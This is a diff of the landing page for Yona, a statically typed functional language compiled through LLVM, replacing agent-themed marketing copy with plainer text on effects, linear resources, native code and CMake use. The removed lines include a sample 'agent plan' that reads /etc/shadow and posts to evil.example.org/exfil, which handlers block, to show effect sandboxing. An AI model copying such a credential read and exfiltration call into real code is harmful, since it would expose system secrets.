@@ -1,136 +1,109 @@
 ---
 title: Yona
-description: A statically typed functional language for the age of autonomous software — effects answered by your handlers, resources scoped by construction, native speed via LLVM.
+description:
+  A statically typed functional language that compiles to native code through
+  LLVM.
 template: splash
 hero:
-  title: The language autonomous software answers to.
+  title: Typed native systems, without runtime ceremony.
   tagline: >-
-    The next programs won't all be written by humans — they will be planned,
-    generated, and executed by machines. Yona is the statically typed
-    functional language built for that world: what a program may do is a
-    fact of its type, checked before anything runs. Then it compiles to
-    native code within reach of C.
+    Yona is a strict, compiled functional language for people who care about
+    inference, explicit effects, deterministic resource lifetimes, and LLVM
+    native code generation.
   actions:
     - text: Quick start
       link: /learn/quick-start/
       icon: right-arrow
       variant: primary
-    - text: Why Yona 2.0
-      link: /why-yona-2/
+    - text: CMake integration
+      link: /reference/cmake/
       variant: secondary
 ---
 
 ```yona
-import println from Std\IO in
+type Result a e = Ok a | Err e
 
-# This plan came from an agent. It can ask — your handler decides.
-let plan = \() -> do
-    secrets = perform Fs.read "/etc/shadow"
-    ack = perform Net.post "https://evil.example.org/exfil"
-    println secrets
-    println ack
-end in
+describe result =
+  case result of
+    Ok value -> "value: {value}"
+    Err error -> "error: {error}"
+  end
+```
 
-handle plan ()
+Yona keeps the language surface small: immutable values, algebraic data types,
+pattern matching, typed effects, and modules. The compiler supplies the rest:
+type inference, coverage analysis, ownership checks, and lowering to LLVM.
+
+## Effects have a boundary
+
+Effects are operations a program performs, not ambient permission to reach into
+the machine. A handler chooses their implementation, which makes tests and
+production policies explicit:
+
+```yona
+let readState = \() -> perform State.get () in
+handle readState ()
 with
-    Fs.read path resume -> resume "[redacted: no filesystem]"
-    Net.post url resume -> resume "[blocked: no network]"
-    return val -> val
+  State.get () resume -> resume "# test configuration"
+  return value -> value
 end
 ```
 
-A Yona program's side effects are *performed operations*, answered by a
-handler you control — never ambient authority over your files, sockets, or
-credentials. The plan above never touched the filesystem or the network: its
-handler answered both requests with policy. The same plan runs against real
-I/O in production and canned data in tests, without changing a line of it.
-[How effects work](/learn/effects/).
+The caller supplies the policy rather than the computation assuming ambient
+state. The compiler reports unhandled operations before an executable is
+produced. Read the [effects guide](/learn/effects/) for the model and its
+current surface.
 
-## The compiler is the reviewer
+## Resources are values with lifetimes
 
-Machine-written code needs a reviewer that never gets tired, never skims,
-and never merges on a hunch. Hindley–Milner inference types every expression
-without annotations. Matches over algebraic data types are checked for
-exhaustiveness. And every effect a program performs is named by the compiler
-until a handler covers it:
-
-```yona
-let plan = \() -> perform Fs.read "/etc/shadow" in
-plan ()
-```
-
-```text
-error: unhandled effect operation: Fs.read
-```
-
-These docs are machine-readable too — fetch
-<a href="/llms.txt" data-astro-reload>/llms.txt</a>, or read the
-[agent guide](/agents/).
-
-## Resources that can't leak
-
-File handles, sockets, and channel endpoints are linear values, tracked so
-that each one is consumed exactly once. `with` scopes a resource to a block
-and releases it deterministically — on exception as on success:
+Files, sockets, and channel endpoints are linear values. `with` scopes a
+resource and consumes it exactly once, including when control leaves early:
 
 ```yona
 import tcpConnect from Std\Net, send from Std\Net in
 
-with conn = tcpConnect "localhost" 8080 in
-    send conn "hello"
-# conn is closed here — no finally, no finalizer
+with connection = tcpConnect "localhost" 8080 in
+  send connection "hello"
 ```
 
-[The type system](/guides/type-system/) states precisely what is checked
-today.
+This is ownership visible in the source, checked by the compiler, and backed by
+native reference counting rather than a tracing collector. See
+[memory and linearity](/guides/memory/).
 
-## Runs like infrastructure
+## Native code is the default deployment
 
-No VM, no garbage collector, no async ceremony. Yona compiles ahead of time
-through LLVM and manages memory with Perceus-style reference counting;
-independent work parallelizes over io_uring and a work-stealing thread
-pool — the parallel version *is* the naive version:
+Yona compiles ahead of time through LLVM to object files and executables. Its
+runtime uses ownership transfer, structural sharing, and uniqueness-based
+updates for persistent collections. Independent work can be expressed without
+thread-pool plumbing:
 
 ```yona
 import readFile from Std\File in
 
-# All three reads in flight at once — no async, no await, no Promise.all.
 let files = ["config.toml", "schema.json", "ca.pem"] in
-[| readFile f for f = files ]
+[| readFile file for file = files ]
 ```
 
-Common benchmarks land within 1–2× of C
-([methodology](/guides/performance/)), and array pipelines lower
-transparently to Vulkan compute ([accelerators](/guides/accelerators/)).
+For systems that need it, the standard library also exposes typed tasks,
+channels, platform I/O, and optional Vulkan-backed accelerators. Start with the
+[language specification](/reference/specification/) or the
+[quick start](/learn/quick-start/).
 
-## Install in one line
+## Use Yona from CMake
 
-```bash
-# Fedora / RHEL
-sudo dnf copr enable kovariadam/yona && sudo dnf install yona
+The installed package includes `yonac`, the runtime and standard library, plus
+an imported compiler target and CMake helpers. A downstream project only needs:
 
-# Ubuntu / Debian
-sudo add-apt-repository ppa:kovariadam/yona && sudo apt install yona
-
-# macOS / Linuxbrew
-brew install akovari/tap/yona
-
-# Arch
-yay -S yona-bin
+```cmake
+find_package(Yona CONFIG REQUIRED)
+yona_add_executable(report SOURCE Report.yona)
 ```
 
-Windows MSI and source builds: see [Installation](/install/).
+The resulting CMake target builds with the packaged compiler and sysroot; no
+shell command or machine-global include path is involved. See
+[CMake integration](/reference/cmake/) for modules, dependencies, and target
+properties.
 
-```bash
-yona -e 'let fib n = if n <= 1 then n else fib (n-1) + fib (n-2) in fib 10'
-# => 55
-```
-
-Yona is free software, licensed under the
-[GPLv3](https://github.com/yona-lang/yona/blob/master/LICENSE.txt).
-Development happens on
-[GitHub](https://github.com/yona-lang/yona).
-The GraalVM/Truffle implementation is archived at
-[yona-lang/yona-graalvm](https://github.com/yona-lang/yona-graalvm).
-Legacy 1.x docs remain at
-[yona-lang.github.io](https://yona-lang.github.io/).
+Yona is free software under the
+[GPLv3](https://github.com/yona-lang/yona/blob/master/LICENSE.txt). Development
+happens on [GitHub](https://github.com/yona-lang/yona).
